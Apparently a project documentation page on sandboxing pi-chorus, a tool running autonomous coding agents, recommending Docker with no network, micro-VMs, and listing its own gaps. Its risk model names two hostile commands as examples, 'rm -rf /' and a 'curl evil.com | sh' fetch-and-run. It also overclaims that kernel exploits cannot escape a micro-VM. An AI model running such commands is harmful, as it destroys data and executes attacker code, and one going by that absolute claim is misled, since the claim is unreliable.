# Sandboxing Pi-Chorus

Pi-chorus runs autonomous agents that execute shell commands and write files. This is a different risk class than one supervised agent. **Sandbox from the start for autonomous runs.**

## Risk Model

Each agent gets:
- A git worktree (isolated filesystem checkout)
- Shell access via `bash` tool
- File write access (constrained by leases and path scope)

Leases and path scope prevent cross-agent file conflicts, but they don't prevent a malicious or buggy agent from running `rm -rf /` or `curl evil.com | sh` via the bash tool.

## Docker (Recommended)

Run the entire pi-chorus mission inside a container:

```bash
docker run --rm -it \
  -v $(pwd):/workspace \
  -v ~/.config/pi-chorus:/root/.config/pi-chorus \
  -e ANTHROPIC_API_KEY \
  --network none \
  node:22 \
  npx pi-chorus run "Build a todo app" --gate "npm test" --auto
```

Key flags:
- `--network none` — no internet access (prevents exfiltration)
- `--rm` — container is destroyed after the run
- `-v $(pwd):/workspace` — only the project directory is mounted
- No `--privileged`, no Docker socket mount

### Dockerfile for CI

```dockerfile
FROM node:22-slim
WORKDIR /workspace
COPY . .
RUN npm ci
ENTRYPOINT ["npx", "pi-chorus"]
```

```bash
docker build -t pi-chorus .
docker run --rm --network none pi-chorus run "Build feature X" --gate "npm test" --auto
```

## Micro-VM (Maximum Isolation)

For production autonomous runs, use a micro-VM:

```bash
# Using Firecracker via ignite (example)
ignite run --cpus 2 --memory 4GB --ssh \
  --copy-files ./:/workspace \
  weaveworks/ignite-ubuntu

# Inside the VM
cd /workspace && npx pi-chorus run "..." --gate "..." --auto
```

Micro-VMs provide hardware-level isolation — even kernel exploits can't escape.

## What Pi-Chorus Does NOT Enforce

- **No process isolation between agents** — all agents run in the same Node.js process
- **No filesystem sandboxing** — lease enforcement is advisory (checked at the tool level, not the OS level)
- **No network restrictions** — agents can make HTTP requests via bash unless you restrict at the container/VM level
- **No resource limits** — agents share CPU/memory with the host unless containerized

## Recommendations by Use Case

| Use case | Sandbox level |
|----------|--------------|
| Development (you're watching) | None needed — human-in-the-loop is on by default |
| CI/CD pipeline | Docker with `--network none` |
| Fully autonomous (unattended) | Micro-VM or Docker with restricted capabilities |
| Untrusted role definitions | Micro-VM only |

## File-Level Safety

Even without OS-level sandboxing, pi-chorus provides:

1. **Path scope per role** — a frontend agent can't claim `migrations/`
2. **Lease enforcement** — writes to unclaimed paths are rejected by the tool layer
3. **Git worktree isolation** — each agent works in its own checkout
4. **Explicit merge** — nothing reaches the integration branch without orchestrator-controlled merge
5. **Verification gate** — the integration branch must pass your test suite

These are defense-in-depth layers, not substitutes for containerization.
